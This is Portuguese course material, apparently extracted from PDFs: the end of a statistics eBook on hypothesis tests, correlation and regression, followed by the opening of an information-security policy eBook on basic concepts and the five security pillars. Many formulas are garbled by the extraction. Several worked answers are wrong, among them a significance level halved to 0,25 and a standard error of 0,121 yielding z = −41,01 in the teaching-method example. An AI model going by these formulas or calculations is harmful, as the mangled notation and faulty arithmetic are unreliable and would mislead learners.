Vamos analisar a estatística de teste para proporção populacional e para média.  

 
 
 
4.3.1 Teste de Hipóteses para proporção populacional. 
Para a proporção populacional a estatística de teste é dada por: 
𝑧=
𝑝̂ −𝑝
b𝑝. (1 −𝑝)
𝑛
 
Sendo 
 𝑝̂ é a proporção amostral,  
𝑝 proporção da população 
𝑛 o tamanho da amostra 
 
Ex: Um candidato Y a prefeito de certa cidade afirma que 60% dos eleitores são 
favoráveis à sua candidatura. Um outro candidato, no entanto, deseja contestar essa 
afirmação, e para isto, contratou uma pesquisa de opinião, na qual o instituto contratado 
usou uma amostra de 200 eleitores. Constatado que dos eleitores entrevistados 110 
eram favoráveis ao candidato Y, pode-se acreditar, ao nível de 5%, que Y tem realmente 
60% da preferência dos eleitores? 
Passo 1: colocaremos à prova a afirmação do candidato Y, isto é, 𝐻9: 𝑝= 0,6  sendo p 
a proporção de eleitores favoráveis a Y. Sabemos que se esta hipótese não for 
verdadeira o outro candidato espera uma porcentagem menor, nunca maior. Portanto, 
a hipótese alternativa, neste caso, é dada por 𝐻&: 𝑝< 0,6 
Passo 2: Vamos usar a estatística para esse caso, sabendo que 𝑝̂ =
&&9
'99 = 0,55 
 
𝑧=
𝑝̂ −𝑝
b𝑝. (1 −𝑝)
𝑛
= 0,55 −0,6
b0,6.0,4
200
= −1,445 
Esse escore não pertence a região de rejeição, portanto não temos motivos para rejeitar 
a hipótese nula.  
 
4.3.2 Teste de Hipóteses para média populacional. 
 
Para o caso de média populacional, utilizamos a seguinte estatística de teste; 

 
 
𝑧= 𝑥̅ −𝜇
𝜎
√𝑛
 
Onde 
𝑥̅ é a média amostral 
𝜇 é a média populacional considerada 
𝜎 é o desvio padrão  
𝑛 é o tamanho da população. 
Ex: A resistência à tração do aço inoxidável produzido numa usina permanecia estável, 
com uma resistência média de 72 𝑘𝑔/𝑚𝑚' e um desvio padrão de 2,0 𝑘𝑔/𝑚𝑚' . 
Recentemente, a máquina foi ajustada. A fim de determinar o efeito do ajuste, 10 
amostras foram testadas. 76,2 78,3 76,4 74,7 72,6 78,4 75,7 70,2 73,3 74,2 Presuma 
que o desvio padrão seja o mesmo que antes do ajuste. Podemos concluir que o ajuste 
mudou a resistência à tração de aço?  
Passo 1: Determinar a hipóteses 
𝐻9: 𝜇= 72  
𝐻&: 𝜇≠72  
Passo 2: Calcular a estatística de teste 
Primeiro precisamos calcular 
 𝑥̅ =
D*,')D:,+)D*,8)D8,D)D',*)D:,8)D(,D)D9,')D+,+)D8,'
&9
= 75 
Agora vamos calcular a estatística 
𝑧= 𝑥̅ −𝜇
𝜎
√𝑛
= 75 −72
2
√10
= 4,74 
Passo 3: Conclusão. 
Como este caso é bilateral, o nível de significância de cada cauda é 
=
' = 0,25 que 
representa escores maiores que 1,96 ou menores que -1,96. Portanto estamos na região 
de rejeição da hipótese nula.  
 
4.3.3 Teste de Hipóteses para diferença entre médias  
 
Vamos analisar o exemplo a seguir; 

 
 
Uma empresa farmacêutica desenvolveu um novo medicamento para controle da 
pressão arterial. Para verificar se o medicamento é realmente eficaz separaram dois 
grupos, um receberia a medicação e o outro o placebo. 
Precisamos criar as hipóteses para o teste, que chamamos de hipótese nula e hipótese 
alternativa.  
Hipótese nula(H0): O medicamento não tem efeito no controle da pressão arterial, a 
diferença em média entre os dois grupos é nula 
Hipótese Alternativa(H1): O medicamento reduz a pressão arterial a diferença em média 
entre os dois grupos é diferente de zero.  
Tivemos o seguinte resultado pesquisando amostra com 5 elementos em cada caso 
Grupo de tratamento(1): -10, -8, -6, -7, -9 
Grupo de controle(2) : -2, -1, 0, -1, -3 
Passos para realizar o teste: 
1. Calcula a média de cada grupo 
𝜇& =
;&9;:;*;D;,
(
= −8    e 𝜇' =
;';&;9;&;+
(
= −1,4 
2. Desvio padrão: 
𝑠& = T(−8 + 10)' + (−8 + 8)' + (−8 + 6)' + (−8 + 7)' + (−8 + 9)'
5 −1
= h2,5 = 1,58 
𝑠' = T(−1,4 + 2)' + (−1,4 + 1)' + (−1,4 + 0)' + (−1,4 + 1)' + (−1,4 + 3)'
5 −1
= h1,3
= 1,14 
3. Calcular a diferença entre as médias:  
−8+1,4= -6,6 
4. Cálculo do erro médio padrão: 
𝐸𝑟𝑟𝑜 𝑝𝑎𝑑𝑟ã𝑜= bE'(
"' +
E((
"( = b&,(:(
(
+
&,&8(
(
= 0,871  
5. Calcular o Valor Z (escore): 
𝑧=
𝜇& −𝜇'
𝐸𝑟𝑟𝑜 𝑝𝑎𝑑𝑟ã𝑜= −6,6
0,871 = −7,57 
6. Conclusão: 
O valor encontrado é menor que -1,64º, logo rejeitaremos a hipótese nula, o que significa 
que o  medicamento reduz a pressão arterial. 

 
 
 
Ex:  Suponha que você é um pesquisador e quer saber se um novo método de ensino 
é mais eficaz do que o método tradicional. Para isso, você realiza um experimento com 
duas turmas de alunos: uma turma usa o método tradicional e a outra turma usa o novo 
método. Após um semestre, você aplica um teste final a ambos os grupos e deseja saber 
se a média das notas dos alunos que usaram o novo método é significativamente 
diferente da média das notas dos alunos que usaram o método tradicional. Foram 
coletadas as notas dos alunos dos dois grupos, cada um com 45 alunos. Suponha que 
a média das notas para o grupo com o novo método seja 85 com desvio padrão de 3,42, 
e a média das notas para o grupo com o método tradicional seja 80 com desvio padrão 
de 4,23. 
 
Passo 1. Formulação das Hipóteses: 
Hipótese Nula (H0): O novo método de ensino não tem efeito nas notas dos alunos. Ou 
seja, a média das notas dos alunos com o novo método é igual à média das notas dos 
alunos com o método tradicional. 
Hipótese Alternativa (H1): O novo método de ensino tem efeito nas notas dos alunos. 
Ou seja, a média das notas dos alunos com o novo método é diferente da média das 
notas dos alunos com o método tradicional. 
Passo 2: Cálculo da estimativa: 
 Cálculo do erro médio padrão: 
𝐸𝑟𝑟𝑜 𝑝𝑎𝑑𝑟ã𝑜= b
E'(
"' +
E((
"( = b+,8'(
8( +
8,'+(
8( = 0,121  
       Calcular o Valor Z (escore): 
𝑧=
𝜇& −𝜇'
𝐸𝑟𝑟𝑜 𝑝𝑎𝑑𝑟ã𝑜= 80 −85
0,121 = −41,01 
O valor-p para esse escore é praticamente nulo.  
Passo 3: Conclusão 
O valor encontrado está dentro da área de rejeição da hipótese nula. Como rejeitamos 
a hipótese nula, concluímos que há evidências suficientes para sugerir que o novo 
método de ensino tem um efeito significativo nas notas dos alunos. Ou seja, a média 
das notas dos alunos que usaram o novo método é significativamente diferente da média 
das notas dos alunos que usaram o método tradicional. 

 
 
EXERCÍCIOS 
 
 
1. Uma amostra aleatória de 5 elementos retirados de uma população com desvio 
padrão 2 unidades, apresentou um valor médio de 52 unidades. Determine um 
intervalo de confiança de 95% para a média populacional R: 𝐼𝐶: (50,25; 53,75) 
2. A tabela abaixo representa uma amostra aleatória de uma população normal com 
variância 16 un². 
𝑥# 
𝑓# 
2 
3 
3 
7 
5 
8 
6 
2 
 
Determine um intervalo de confiança para 98% da população. (neste caso 
teremos que determinar o escore por meio da tabela de distribuição normal e usar 
a fórmula para e calcular a média e o desvio padrão) R: 𝐼𝐶: (1,86; 6,03) 
 
3. De uma população com distribuição normal deve ser retirada uma amostra 
aleatória que avalie o média populacional com erro-padrão de estimativa de duas 
unidades. Se o desvio-padrão populacional é 𝜎= 10, qual deve ser o tamanho 
da amostra a um nível de confiança de 90%? R: 𝑛= 68 
4. Um processo deveria produzir bancadas com 0,85 m. Um engenheiro desconfia 
que as bancadas estão diferentes do especificado. Uma amostra de 8 valores foi 
coletada e indicou 𝑥̅ = 0,87. Sabendo-se que o desvio padrão 𝜎= 0,01 teste a 
hipótese do engenheiro com nível de significância de 5%.  R: Rejeitamos a 
hipótese nula, ou seja, as barras apresentam em média tamanho diferente de 
0,85 m. 
5. Uma empresa retira periodicamente amostras aleatórias de 500 peças de sua 
linha de produção para análise da qualidade. As peças da amostra são 
classificadas como defeituosas ou não, sendo que a política da empresa exige 
que o processo produtivo seja revisto se houver evidência de mais que 1,5% de 

 
 
peças defeituosas. Na última amostra, foram encontradas nove peças 
defeituosas. Usando nível de significância de 1%, o processo precisa ser revisto? 
R: O processo não precisará ser revisto, pois não há evidências que mais de 
1,5% das peças apresentem defeito, ao um nível de significância de 1%. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
UNIDADE 5: REGRESSÃO E CORRELAÇÃO LINEAR 
  
Nessa unidade apresentaremos ferramentas para determinar se existe uma correlação 
linear entre as variáveis, caso exista representar as varáveis por uma função linear 
chamada de regressão linear 
 
5.1 Correlação Linear 
Existe uma correlação entre duas variáveis quando os valores de uma variável estão 
relacionados, de alguma maneira, com os valores da outra variável. 
Existe uma correlação linear entre duas variáveis quando há uma correlação e os pontos 
marcados para os dados emparelhados resultam em um padrão que pode ser 
aproximado por uma reta. 
Antes de calcular o coeficiente de correlação linear é necessário observar se amostra é 
aleatória simples, o diagrama de dispersão e a existência de valores atípicos que devem 
ser retirados. Antes de aplicar o coeficiente de correlação linear, devemos analisar os 
dados, se realmente estão sujeitos à técnica.  
Os diagramas de dispersão num geral já dão ideia sobre a correlação:
 
FONTE: [1] 

 
 
O coeficiente de correlação linear mede a força da correlação linear em variáveis que 
estão emparelhadas.  
O coeficiente de correlação linear é dado pela fórmula: 
𝑟=
∑(𝑥# −𝜇!)(𝑦# −𝜇F)
b∑(𝑥# −𝜇!)'. ∑m𝑦# −𝜇Fn
'
 
Podemos calcular cada etapa em separado e depois substituir na fórmula.  
Para interpretar se o coeficiente de correlação linear é "bom" ou "forte", considere o 
seguinte: 
Magnitude do Coeficiente 𝒓:  Quanto mais próximo de 1, mais forte é a correlação 
linear. Por exemplo, 𝑟= 0,8 indica uma correlação forte, enquanto 𝑟= 0,2 indica uma 
correlação fraca. 
Direção da Correlação: O sinal de 𝑟 indica a direção da relação linear. Um valor positivo 
indica uma relação positiva (variáveis aumentam juntas), enquanto um valor negativo 
indica uma relação negativa (uma variável aumenta enquanto a outra diminui). 
Contexto da Aplicação: A interpretação do "bom" coeficiente de correlação depende 
do contexto da aplicação. Por exemplo, em estudos científicos, coeficientes de 
correlação acima de 0.5 podem ser considerados razoavelmente bons, enquanto em 
outras áreas, como finanças, podem ser necessárias correlações muito mais altas para 
serem úteis. 
 
Ex: É esperado que a massa muscular de uma pessoa diminua com a idade. Para 
estudar essa relação, uma nutricionista selecionou 18 mulheres, com idade entre 40 e 
79 anos, e observou em cada uma delas a idade (X) e a massa muscular (Y).  
Massa muscular (Y) 82 91 100 68 87 73 78 80 65 84 116 76 97 100 105 77 73 78  
Idade (X) 71 64 43 67 56 73 68 56 76 65 45 58 45 53 49 78 73 68 
Determine o coeficiente de correlação linear.  
Vamos calcular a média de cada variável: 
𝜇!
= 82 + 91 + 100 + 68 + 87 + 73 + 78 + 80 + 65 + 84 + 116 + 76 + 97 + 100 + 105 + 77 + 73 + 78
18
= 85 

 
 
𝜇F
= 71 + 64 + 43 + 67 + 56 + 73 + 68 + 56 + 76 + 65 + 45 + 58 + 45 + 53 + 49 + 78 + 73 + 68
18
= 59,9 
 
 
Vamos calcular a fórmula por partes na tabela abaixo 
 
 
Pelo valor do coeficiente de relação linear, existe uma correlação negativa forte entre as 
variáveis.  
 
Ex: Os dados a seguir relacionam o diâmetro (X) de uma fibra e o logaritmo de base 10 
(Y) da força de rompimento. Determine o coeficiente de correlação linear 
Vamos gerar o gráfico de dispersão nesse caso: 
 

 
 
 
Pelo gráfico de dispersão podemos verificar que existe uma correlação linear positiva 
entre as variáveis. 
Vamos determinar o coeficiente de correlação utilizando a planilha do Excel do exemplo 
anterior, alterando apenas os dados 
 
 
Nesse caso temos um coeficiente de correlação linear positivo, forte.  
 
5.2 Regressão linear 
 
Caso haja correlação linear considerável entre duas variáveis, usamos métodos para 
encontrarmos a equação da reta que melhor se ajusta ao diagrama de dispersão dos 
dados amostrais. A reta de melhor ajuste se chama reta de regressão linear. Podemos 
usar a equação de regressão para fazer predições para o valor de uma das variáveis 
dado algum valor específico da outra variável. 
A equação para essa reta é dada por: 
𝑦= 𝑏9 + 𝑏&𝑥, onde:  ∑𝑦 
 
𝑏& =
"(∑!F);∑!.∑F
"H∑!(I;(∑!)(    e  𝑏9 =
(∑F)H∑!(I;∑!.(∑!F)
"H∑!(I;(∑!)(
 
 
Ex: Vamos utilizar a tabela abaixo, vista no exemplo anterior para determinar a 
regressão linear entre x e y.  

 
 
 
 
Daí a regressão linear é  
𝑦= −0,282 + 0,028𝑥 
 
Vamos substituir alguns valores de 𝑥 na equação  
 

 
 
 
 
Analisando os valores reais de y, percebemos que os valores determinados pela 
regressão linear são próximos dos reais. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
EXERCÍCIOS 
 
1. Em mercadologia é importante conhecer as ferramentas existentes para 
estimação dos custos de produção. A análise de regressão representa um 
instrumento valioso para a realização dessa tarefa. Assim, utilizando os dados 
abaixo, verificou-se que a reta de regressão adequada é: 
a) Y = - 15,79 + 8,63x  
b) Y = 15,79 - 8,63x  
c) Y = 35,79 - 8,63x 
d) Y = 15,79 + 8,63x  
e) Y = 35,79 – 8,63x 
 
2. Na tabela a seguir estão os dados de diâmetro (mm) e peso (kg) de 10 amostras 
de rochas. 
 

 
 
 
 
O coeficiente de determinação e a reta de ajuste de regressão linear são 
respectivamente:  
a)  r² = 0,9315; Y = -12,627 + 0,807x  
b)  r² = 0,8677; Y = -12,627 + 0,807x  
c)  r² = - 0,8677; Y = -12,627 - 0,807x  
d)  r = 0,8677; Y = -12,627 + 0,807x  
e)  r² = 0,8677; Y = 12,627 + 0,807x 
3. Escolha uma das tabelas acima e gere no Excel ou outro programa o gráfico da 
regressão linear 
 
1. Letra D  
2. Letra B 
 
 
 
 
 
 
 

 
 
PARA FINALIZAR 
 
Espero que concluindo nossos estudos você esteja mais consciente sobre a 
importância e aplicações da Estatística em diversas áreas do conhecimento e que as 
fórmulas que por vezes são assustadoras podem ser calculadas facilmente com o 
auxílio de algum programa ou aplicativo.  
Começamos a realizar inferência estatística de forma básica, analisando 
conceitos, medidas de centralidade e dispersão para decidir sobre qual a melhor forma 
de representar os dados, assim como técnicas para definir qual a confiança de medidas 
representativas dos dados. 
A inferência estatística vai muito, muito além do que vimos, mas já iniciamos a 
jornada para orientar melhor nossas análises e tomadas de decisões, cumprindo assim 
o objetivo proposto. 
O conteúdo que estudamos aqui é um resumo de cada tópico, logo é necessário 
complementar o aprendizado com a bibliografia indicada, vídeos, artigos e sites 
especializados.  
Meu desejo é que se aprofundem e dominem o assunto ou, pelo menos, que 
tenha aberto sua mente para a importância de observar melhor a Estatística no seu dia 
a dia. 
 
 
 
Professora Fabiana Chagas 
 
 
 
 
 
 
 
 
 

 
 
Professora Fabiana Chagas 
SOBRE A AUTORA 
 
Mestre em Matemática Pura pela Universidade Federal de Goiás (2007). 
Bacharel em Matemática pela Universidade Federal de Goiás (2004). Graduação em 
PROGRAMA DE FORMAÇÃO DE PROFESSORES pela Universidade Católica de 
Brasília (2011) . Curso Técnico em Edificações pelo Centro Federal de Educação 
Tecnológica de Goiás -CEFET (1999). Possui MBA Essencial Master Coaching pelo 
IPOG-(2019). Especialista em Desenvolvimento Humano e Psicologia Positiva pelo 
IPOG- (2022).  
Já atuou como docente na Universidade Federal de Goiás (2009 a 2010), na 
UNIFAN (2008 a 2010), no Instituto de Ensino Superior Aphonsiano (2009 a 2010), no 
Instituto Federal de Educação Tecnológica em regime de Dedicação Exclusiva (2010 a 
2011), na Pontifícia Universidade Católica de Goiás como docente e como Professora 
Tutora em EAD para diversos cursos.  
Atualmente é docente do Instituto de Pós-Graduação e Graduação (IPOG), aluna 
do curso Tecnólogo em Data Science e no MBA em Neurociências aplicada ao 
desenvolvimento humano e de organizações pelo IPOG.  
Tem experiência na área de Matemática, com ênfase em Matemática, atuando 
principalmente nos seguintes temas: modelagem matemática, cálculo e geometria. 
Pesquisadora em Desenvolvimento Humano, Inteligência Positiva e Neurociências. 
 
 
 
 

 
 
Referências Bibliográficas:    
 
1. TRIOLA, Mario F. Introdução à Estatística. 12. ed. Rio de Janeiro. LTC, 2017. 
2. BUSSAB, Wilton de Oliveira; MORETTIN, Pedro Alberto. Estatística Básica. 8ª. 
ed. São Paulo: Atual, 2011.  
3. SILVA, Elio Medeiros da; SILVA, Ermes Medeiros da; GONÇALVES, Valter; 
MUROLO, Afrânio Carlos. Estatística para os cursos de Economia, Administração 
e Ciências Contábeis, vol 2. 4°. ed. São Paulo: Atlas, 2010.  
 


--- Fim do arquivo: eBook - Estatística 2.pdf ---

--- Começo do arquivo: eBook - Política de Segurança.pdf ---

 
 
1.1 CONCEITOS E DEFINIÇÕES 
 
Conceitos e Definições 
 
A Segurança da Informação existe para proteger informações que possuam 
valor, contra ameaças diversas. As informações podem ser pessoais ou 
corporativas e podem se apresentar em diferentes formatos, como dados 
digitais, documentos em papel, conversas verbais, ativos computacionais, entre 
outros. Para garantir essa proteção, são estabelecidas práticas, medidas e 
técnicas que assegurem a confidencialidade, integridade e disponibilidade das 
informações. 
 
Termos 
Política: conjunto de diretrizes, normas e controles aplicáveis a recursos, 
pessoas e ativos corporativos, alinhadas aos valores e missão da organização, 
visando alcançar determinados objetivos. 
Diretriz: conjunto de orientações que determinam meios para estabelecer planos 
e ações. 
Normas: conjunto de regras usadas para resolver ou prevenir problemas, 
normalmente dentro das políticas e aprovadas por um grupo de stakeholders. 
Procedimento: conjunto de ações detalhadas referentes a um controle ou regra, 
detalhando as ações a serem seguidas. 
Framework: estruturas pré-estabelecidas que fornecem as ferramentas 
necessárias para apoiar um projeto, uma área ou uma política. 
Compliance: estar em conformidade com as regras e políticas, sejam elas 
internas ou externas ou regulações do mercado. 
Stakeholder: grupo de interesse em um determinado assunto ou projeto. 
Controle de Acesso: medida de segurança para restrição de acesso à 
informação. 
Backup: medida de segurança para criação de cópias das informações para 
prevenção de perda de dados. 
Firewall: medida de segurança que cria barreiras lógicas para controle e 
monitoramento do tráfego. 
Criptografia: algoritmos que, através de chaves públicas e privadas, tornam as 
informações embaralhadas e ilegíveis, exceto para quem possui as chaves de 
acesso. 

 
 
Antimalware: ferramentas de segurança para detectar softwares maliciosos ou 
nocivos. 
1.2. ORIGEM DA SEGURANÇA DA INFORMAÇÃO 
 
Embora existam diferentes datas para o início da segurança da informação, há 
consenso de que a preocupação com segurança começou a surgir à medida que 
a computação evoluiu, por volta da metade do século XX. A segurança da 
informação começou a tomar forma na década de 70, com o surgimento da 
ARPA e da internet, e a popularização dos computadores pessoais. Nos anos 
90, a segurança da informação passou a ser uma preocupação global, com a 
expansão da internet. 
 
 
 
Figura 1.1: Linha do tempo dos principais eventos relacionados à segurança da 
informação desde a década de 70. 
 
Perceba na figura acima, que à medida que as tecnologias evoluem, os eventos 
ou controles de segurança começam a ser mais presentes e a cada década que 
passa mais eventos ocorrem num menor espaço de tempo. Isso mostra como a 
segurança da informação passa a ser uma discussão latente nos últimos anos.  
É recomendado que você busque informações complementares sobre cada um 
destes eventos históricos, pois vai enriquecer seus conhecimentos sobre 
tecnologia e ajudar na compreensão sobre determinados marcos em segurança 
da informação, como por exemplo o surgimento do PCI-DSS, os primeiros casos 
de ataques massivos de negação de serviço, e os primeiros ransomwares 
significativos que pararam operações e impactaram negativamente os negócios, 
onde alguns deles inclusive deixaram de existir. 
 
1.3. IMPORTÂNCIA DA SEGURANÇA DA INFORMAÇÃO 
 
Num mundo cada vez mais globalizado, onde pagamentos são feitos na palma 
da mão e serviços antes analógicos e agora digitalizados, a segurança da 
informação se torna crucial para proteger dados pessoais e corporativos. Além 
de combater ameaças, é necessário implementar mais medidas de proteção de 
dados devido a diversas normas e leis, como BACEN, PCI-DSS, SOx, GDPR e 
LGPD. 
Lembre-se sempre que, é muito menos custoso prevenir do que remediar. 
Entenda que com a prevenção, você tem a oportunidade de mapear potenciais 
riscos, evitar de materializar vulnerabilidades e mitigar fragilidades do seu 

 
 
negócio, enquanto remediar, é necessário criar planos de ação, concorrer com 
backlog de atividades das equipes que tem suas metas a serem alcançadas, 
alocar recursos e pessoas, gastar tempo e dinheiro para resolver o problema. 
Remediar é mais fácil de materializar o problema, pois o risco ou a 
vulnerabilidade existe, enquanto prevenção requer mais senso crítico e 
persuasão, pois é mais difícil de tangibilizar os potenciais problemas. Entretanto, 
aprenderemos aqui algumas maneiras de evidenciar isso, com técnicas e 
procedimentos úteis no dia a dia. 
 
As empresas e altas lideranças precisam ter consciência que atualmente, a 
segurança da informação é um elemento essencial para o funcionamento 
saudável de qualquer empresa, independentemente de seu tamanho ou setor de 
atuação. À medida que o mundo dos negócios se torna cada vez mais 
digitalizado, as informações corporativas, dados pessoais de clientes e outros 
ativos digitais tornam-se alvos frequentes de ameaças cibernéticas. A 
implementação de práticas robustas de segurança da informação é crucial para 
a continuidade dos negócios e para a proteção dos ativos mais valiosos de uma 
organização. 
 
Proteção de ativos digitais: os ativos digitais, como bancos de dados, registros 
financeiros, propriedade intelectual e informações sobre clientes, são 
fundamentais para a operação de uma empresa. Sem medidas adequadas de 
segurança, esses ativos estão em risco constante de serem comprometidos, seja 
por ataques cibernéticos, violações de dados ou falhas internas. A segurança da 
informação atua como a primeira linha de defesa contra esses riscos, protegendo 
a integridade e a confidencialidade dos dados. 
 
Continuidade dos negócios: a segurança da informação está diretamente 
ligada à capacidade de uma empresa de continuar suas operações sem 
interrupções significativas. Incidentes de segurança, como ataques de 
ransomware ou falhas nos sistemas de TI, podem paralisar as operações, 
resultando em perdas financeiras e danos à reputação da empresa. Ao 
implementar um plano robusto de segurança, as empresas podem garantir que, 
mesmo em caso de incidentes, terão medidas de resposta e recuperação em 
vigor, minimizando o impacto e assegurando a continuidade dos negócios. 
 
Conformidade com regulamentações: com o aumento das regulamentações 
em torno da proteção de dados, como a Lei Geral de Proteção de Dados (LGPD) 
no Brasil e o Regulamento Geral sobre a Proteção de Dados (GDPR) na União 
Europeia, a conformidade tornou-se uma necessidade para todas as empresas 
que lidam com dados pessoais. O não cumprimento dessas leis pode resultar 
em multas pesadas e sanções legais, além de danos irreparáveis à reputação 
da empresa. A segurança da informação garante que as práticas e políticas 
internas estejam alinhadas com as exigências regulatórias, evitando riscos legais 
e mantendo a confiança dos clientes. 
 
Confiança de clientes e parceiros: a confiança é um dos pilares mais 
importantes para qualquer empresa. Clientes e parceiros de negócios esperam 
que as empresas protejam suas informações pessoais e comerciais com o maior 
cuidado. A segurança da informação desempenha um papel vital na construção 
e manutenção dessa confiança, ao assegurar que os dados sejam tratados com 

 
 
a máxima segurança. Empresas que demonstram um compromisso com a 
segurança da informação não apenas protegem seus dados, mas também 
fortalecem seus relacionamentos comerciais e sua reputação no mercado. 
 
Prevenção de fraudes e ataques: fraudes internas e ataques cibernéticos são 
ameaças reais para qualquer empresa, podendo resultar em perdas financeiras 
significativas e em exposição de dados sensíveis. A segurança da informação 
ajuda a prevenir esses incidentes por meio da implementação de controles 
rigorosos de acesso, monitoramento constante das atividades, criptografia de 
dados e outras medidas preventivas. Ao reduzir a vulnerabilidade a ataques e 
fraudes, as empresas podem operar de maneira mais segura e eficiente. 
 
Melhoria da eficiência operacional: a implementação de políticas e práticas de 
segurança da informação também contribui para a melhoria da eficiência 
operacional. Ao padronizar processos e garantir que todos os colaboradores 
compreendam a importância da segurança, as empresas podem minimizar erros 
humanos e evitar falhas sistêmicas que possam comprometer a operação. Além 
disso, a segurança da informação promove uma cultura organizacional de 
responsabilidade e consciência, onde cada funcionário entende seu papel na 
proteção dos ativos da empresa. 
 
 
 
Em um cenário corporativo cada vez mais digitalizado, a segurança da 
informação não é apenas uma medida preventiva, mas uma necessidade 
estratégica. Empresas que investem em práticas robustas de segurança 
protegem seus ativos, garantem a continuidade dos negócios, cumprem 
regulamentações legais e mantêm a confiança de clientes e parceiros. A 
segurança da informação é, portanto, um componente essencial para o sucesso 
e a sustentabilidade de qualquer negócio no mundo moderno. 
 
 
1.4. PRINCÍPIOS DE SEGURANÇA DA INFORMAÇÃO 
 
A segurança da informação é fundamentada em princípios que orientam a 
proteção dos dados e sistemas dentro de uma organização. Esses princípios são 
essenciais para garantir que as informações sejam protegidas contra acessos 
não autorizados, alterações indevidas, e outras ameaças que possam 
comprometer a confidencialidade, integridade e disponibilidade dos dados. A 
compreensão e a aplicação desses princípios são cruciais para a construção de 
uma política de segurança da informação robusta e eficaz, bem como a base 
sólida para qualquer área de segurança da informação. 
 
Em segurança da informação existem 5 pilares chave para trabalhar qualquer 
tema ou assunto. Podemos resumi-los desta maneira: 
 
Confidencialidade: garante que a informação só seja acessível pelas partes 
autorizadas. 
Integridade: garante que a informação não seja alterada de maneira indevida 
ou não autorizada. 

 
 
Disponibilidade: garante que a informação ou ativo esteja acessível sem 
interrupções. 
Autenticidade: garante que a informação é verdadeira e veio da fonte indicada. 
Não-repúdio: garante que a parte envolvida em uma ação online não possa 
negar ter realizado a ação. 
 
Algumas literaturas da área podem divergir algumas premissas, como por 
exemplo tratar não-repúdio como irretratabilidade, que na prática é a mesma 
coisa. Outras literaturas acrescentam aos cinco pilares aqui apresentados um 
sexto pilar adicional, que é conformidade – que busca adesão as normas e 
regulamentações relacionadas a segurança da informação. 
 
Existem ainda profissionais da área que trabalham com outros 6 pilares 
adjacentes a Confidencialidade, Integridade e Disponibilidade, sendo eles: 
Prevenção, Detecção, Resposta, Tecnologias, Processos e Pessoas. Nenhuma 
dessas abordagens é errada, vai depender do contexto organizacional e do time 
de segurança que está trabalhando essas questões no cotidiano. Entretanto, 
acredito que a visão dos 5 pilares de Confidencialidade, Integridade, 
Disponibilidade, Autenticidade e Não Repúdio é muito abrangente e passa por 
temáticas relacionadas a prevenção, processos e pessoas, além de se aplicar a 
qualquer tecnologia ou contexto. 
 
Vamos entender melhor com mais profundidade os 5 pilares? 
 
1. Confidencialidade 
 
O que é? A confidencialidade garante que as informações sejam acessíveis 
apenas a pessoas, entidades ou processos autorizados. Ela protege os dados 
contra acessos não autorizados, garantindo que informações sensíveis, como 
dados pessoais, financeiros ou proprietários, permaneçam privadas. 
 
Exemplos de aplicabilidade 
 
• 
Controles de acesso: implementar mecanismos como autenticação 
multifatorial, senhas fortes e gerenciamento de privilégios para garantir 
que apenas usuários autorizados possam acessar informações sensíveis. 
• 
Treinamento de funcionários: educar os colaboradores sobre a 
importância da confidencialidade e as práticas seguras de manuseio de 
informações sensíveis. 
 
Importância: proteger a confidencialidade dos dados é essencial para evitar 
vazamentos de informações que possam levar a perdas financeiras, danos à 
reputação e violações legais. 
 
2. Integridade 
 
O que é? A integridade assegura que as informações permaneçam precisas, 
completas e livres de alterações não autorizadas. Ela protege os dados contra 
modificação, exclusão ou corrupção, garantindo que as informações reflitam 
corretamente o que foi intencionado. 
 

 
 
 
 
Exemplos de aplicabilidade 
 
• 
Controles de alteração: utilizar controles como trilhas de auditoria, 
versionamento de documentos e assinaturas digitais para monitorar e 
registrar alterações feitas nas informações. 
• 
Validação de dados: implementar mecanismos de validação e verificação 
para garantir que os dados inseridos e processados estejam corretos e 
sejam consistentes com as expectativas. 
 
 
Importância: a integridade dos dados é crítica para a tomada de decisões, pois 
informações incorretas ou manipuladas podem levar a decisões erradas e 
consequências prejudiciais. 
 
3. Disponibilidade 
 
O que é? A disponibilidade garante que as informações e os sistemas estejam 
acessíveis e utilizáveis por usuários autorizados sempre que necessário. Ela 
protege contra interrupções que possam afetar o acesso às informações. 
 
Exemplos de aplicabilidade 
 
• 
Redundância e failover: implementar sistemas de redundância e planos 
de failover para assegurar que os serviços continuem operacionais em 
caso de falha de componentes ou sistemas. 
• 
Monitoramento e manutenção: realizar monitoramento contínuo e 
manutenção preventiva dos sistemas para identificar e corrigir problemas 
antes que eles causem interrupções. 
• 
Planos de recuperação de desastres: desenvolver e testar planos de 
recuperação de desastres (DRP) para garantir que a organização possa 
rapidamente restaurar a disponibilidade de serviços após um incidente. 
 
Importância: a disponibilidade é essencial para a continuidade dos negócios, 
garantindo que os processos críticos não sejam interrompidos, o que pode 
resultar em perdas financeiras e operacionais significativas. 
 
4. Autenticidade 
 
O que é? A autenticidade assegura que as informações sejam genuínas e que 
as identidades das partes envolvidas em uma comunicação ou transação sejam 
verdadeiras. Este princípio evita a falsificação e garante que as informações 
estejam sendo trocadas entre as partes corretas. 
 
Exemplos de aplicabilidade 
 
• 
Assinaturas digitais: utilizar assinaturas digitais para garantir que os 
documentos e as comunicações não foram alterados e que a identidade 
do remetente foi verificada. 

 
 
• 
Certificados digitais: implementar certificados digitais para autenticar a 
identidade de usuários, dispositivos e sistemas em redes e transações 
online. 
• 
Verificação de identidade: adotar procedimentos rigorosos de verificação 
de identidade para autenticar usuários antes de conceder acesso a 
sistemas e informações. 
 
Importância: a autenticidade previne fraudes e assegura a confiabilidade das 
informações e das comunicações, protegendo a organização contra riscos de 
segurança e reputacionais. 
 
5. Não-repúdio 
 
O que é? O não-repúdio garante que uma parte em uma transação ou 
comunicação não possa negar a autoria de uma ação realizada. Ele assegura 
que tanto o remetente quanto o destinatário de uma informação possam ser 
identificados e responsabilizados por suas ações. 
 
Exemplos de aplicabilidade 
 
• 
Assinaturas digitais: implementar assinaturas digitais para fornecer 
provas irrefutáveis da origem e da integridade de uma comunicação ou 
transação. 
• 
Trilhas de auditoria: manter trilhas de auditoria detalhadas que registrem 
todas as ações realizadas por usuários, permitindo a verificação e 
responsabilização em caso de disputa. 
• 
Registros de transações: manter registros completos e seguros de todas 
as transações, garantindo que possam ser revisados e validados 
posteriormente. 
 
Importância: o não-repúdio é crucial para resolver disputas e assegurar a 
confiança nas transações digitais, protegendo a organização contra fraudes e 
litígios. 
 
 
 
Lembrete 
 
Perceba ainda que, não importa a abordagem ou literatura, sempre será uma 
